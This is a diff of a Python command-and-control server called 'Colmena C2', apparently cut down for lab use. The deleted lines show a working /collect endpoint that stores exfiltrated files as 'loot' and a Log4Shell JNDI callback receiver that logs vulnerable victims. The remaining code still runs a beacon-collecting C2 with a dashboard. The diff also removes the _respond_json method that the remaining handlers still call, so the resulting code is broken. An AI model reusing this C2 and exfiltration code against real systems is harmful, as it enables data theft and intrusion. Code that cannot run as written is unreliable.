@@ -1,65 +1,34 @@
 #!/usr/bin/env python3
 """
-Colmena C2 Server - Receives exfiltrated data and agent beacons.
+Colmena C2 Server - Receives agent beacons (reference implementation).
 Real HTTPS endpoint with TLS (self-signed or provided cert).
+
+Ronda 6: los endpoints de exfiltración (/collect, loot) y el callback
+Log4Shell (/jndi) fueron ELIMINADOS. Este servidor de referencia solo
+recibe beacons de la colonia y expone monitoreo.
 
 Usage:
     python3 c2_server.py [--port 8443] [--cert server.crt] [--key server.key]
-    python3 c2_server.py --port 8080  # plain HTTP for lab
+    python3 c2_server.py --port 8080 --no-tls  # plain HTTP for lab
 
 Endpoints:
-    POST /collect     - Receive exfiltrated files
     POST /beacon      - Receive agent heartbeat/status
     GET  /health      - Health check
-    GET  /logs        - View received data summary
+    GET  /logs        - View received beacon summary
 """
 
 import argparse
 import json
 import os
 import ssl
-import sys
-import hashlib
 import time
 from datetime import datetime
-from pathlib import Path
 from http.server import HTTPServer, BaseHTTPRequestHandler
-from urllib.parse import urlparse, parse_qs
+from urllib.parse import urlparse
 
 # ── Data Store ────────────────────────────────────────────────────────────────
 
-LOOT_DIR = Path("./loot")
-LOOT_DIR.mkdir(exist_ok=True)
-
 BEACONS = []
-EXFIL_LOG = []
-
-
-def save_loot(filename, data, agent_info=None):
-    """Save exfiltrated data to disk."""
-    safe_name = filename.replace("/", "_").replace("\\", "_")
-    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    filepath = LOOT_DIR / f"{ts}_{safe_name}"
-
-    with open(filepath, 'wb') as f:
-        f.write(data)
-
-    entry = {
-        'timestamp': datetime.now().isoformat(),
-        'filename': filename,
-        'size': len(data),
-        'sha256': hashlib.sha256(data).hexdigest(),
-        'path': str(filepath),
-        'agent': agent_info,
-    }
-    EXFIL_LOG.append(entry)
-
-    # Keep log file
-    with open(LOOT_DIR / "exfil_log.json", 'w') as f:
-        json.dump(EXFIL_LOG, f, indent=2)
-
-    return entry
-
 
 # ── HTTP Handler ──────────────────────────────────────────────────────────────
 
@@ -97,30 +66,7 @@ class C2Handler(BaseHTTPRequestHandler):
         agent_id = self.headers.get('X-Agent-ID', 'unknown')
         agent_role = self.headers.get('X-Agent-Role', 'unknown')
 
-        if parsed.path == '/collect':
-            filename = self.headers.get('X-File-Name', 'data.bin')
-
-            # Handle base64 encoded body
-            if self.headers.get('Content-Transfer-Encoding') == 'base64' or self._is_base64(body):
-                import base64
-                try:
-                    body = base64.b64decode(body)
-                except Exception:
-                    pass
-
-            entry = save_loot(filename, body, {
-                'agent_id': agent_id,
-                'agent_role': agent_role,
-            })
-
-            self._respond_json(200, {
-                'status': 'received',
-                'sha256': entry['sha256'],
-                'size': entry['size'],
-            })
-            print(f"  EXFIL: {filename} ({len(body)} bytes) from {agent_role}:{agent_id[:8]}")
-
-        elif parsed.path == '/beacon':
+        if parsed.path == '/beacon':
             beacon_data = {}
             try:
                 beacon_data = json.loads(body)
@@ -143,21 +89,6 @@ class C2Handler(BaseHTTPRequestHandler):
             })
             print(f"  BEACON: {agent_role}:{agent_id[:8]} from {self.client_address[0]}")
 
-        elif parsed.path == '/jndi':
-            # Log4Shell callback endpoint (LDAP/JNDI)
-            victim_ip = self.client_address[0]
-            victim_host = self.headers.get('X-Victim-Host', victim_ip)
-            callback_data = {
-                'timestamp': datetime.now().isoformat(),
-                'victim_ip': victim_ip,
-                'victim_host': victim_host,
-                'method': 'log4shell_jndi',
-                'raw_query': parsed.query,
-            }
-            BEACONS.append(callback_data)
-            print(f"  LOG4SHELL CALLBACK: {victim_host} ({victim_ip}) - VULNERABLE!")
-            self._respond_json(200, {'status': 'logged', 'callback': 'received'})
-
         else:
             self._respond_json(404, {'error': 'unknown endpoint'})
 
@@ -167,14 +98,12 @@ class C2Handler(BaseHTTPRequestHandler):
         if parsed.path == '/health':
             self._respond_json(200, {
                 'status': 'ok',
-                'exfil_count': len(EXFIL_LOG),
                 'beacon_count': len(BEACONS),
                 'uptime': time.time(),
             })
 
         elif parsed.path == '/logs':
             self._respond_json(200, {
-                'exfiltrations': EXFIL_LOG[-50:],
                 'beacons': BEACONS[-50:],
             })
 
@@ -183,13 +112,6 @@ class C2Handler(BaseHTTPRequestHandler):
 
         else:
             self._respond_json(404, {'error': 'not found'})
-
-    def _respond_json(self, code, data):
-        self.send_response(code)
-        self.send_header('Content-Type', 'application/json')
-        self.send_header('Access-Control-Allow-Origin', '*')
-        self.end_headers()
-        self.wfile.write(json.dumps(data, indent=2).encode())
 
     def _serve_dashboard(self):
         html = f'''<!DOCTYPE html>
@@ -202,12 +124,7 @@ table{{width:100%;border-collapse:collapse}}th,td{{padding:4px 8px;text-align:le
 th{{color:#5c6773}} .green{{color:#73d0a0}} .red{{color:#f07178}}
 </style></head><body>
 <h1>COLMENA C2 SERVER</h1>
-<p>Exfiltrated: {len(EXFIL_LOG)} files | Beacons: {len(BEACONS)}</p>
-
-<h2>Recent Exfiltrations</h2>
-<table><tr><th>Time</th><th>File</th><th>Size</th><th>SHA256</th></tr>
-{''.join(f"<tr><td>{e['timestamp'][:19]}</td><td>{e['filename']}</td><td>{e['size']}</td><td style='font-size:10px'>{e['sha256'][:16]}</td></tr>" for e in EXFIL_LOG[-20:])}
-</table>
+<p>Beacons: {len(BEACONS)}</p>
 
 <h2>Recent Beacons</h2>
 <table><tr><th>Time</th><th>Agent</th><th>IP</th><th>Data</th></tr>
@@ -220,16 +137,6 @@ th{{color:#5c6773}} .green{{color:#73d0a0}} .red{{color:#f07178}}
         self.send_header('Content-Type', 'text/html')
         self.end_headers()
         self.wfile.write(html.encode())
-
-    def _is_base64(self, data):
-        try:
-            import base64
-            if len(data) < 4:
-                return False
-            base64.b64decode(data[:min(100, len(data))])
-            return True
-        except Exception:
-            return False
 
 
 # ── Main ─────────────────────────────────────────────────────────────────────
@@ -262,7 +169,7 @@ def main():
                         'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
                         '-keyout', f.name, '-out', f.name,
                         '-days', '365', '-nodes',
-                        '-subj', '/CN=ColmenaC2/O=Colmena/OU=RedTeam'
+                        '-subj', '/CN=ColmenaC2/O=Colmena/OU=Lab'
                     ], capture_output=True, check=True)
                     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                     ctx.load_cert_chain(f.name, f.name)
@@ -276,11 +183,9 @@ def main():
         print(f'C2 Server: http://{args.host}:{args.port} (plain HTTP)')
 
     print(f'Endpoints:')
-    print(f'  POST /collect  - Receive exfiltrated files')
     print(f'  POST /beacon   - Receive agent beacons')
     print(f'  GET  /health   - Health check')
     print(f'  GET  /         - Dashboard')
-    print(f'Loot directory: {LOOT_DIR.absolute()}')
     print(f'Press Ctrl+C to stop')
 
     try:
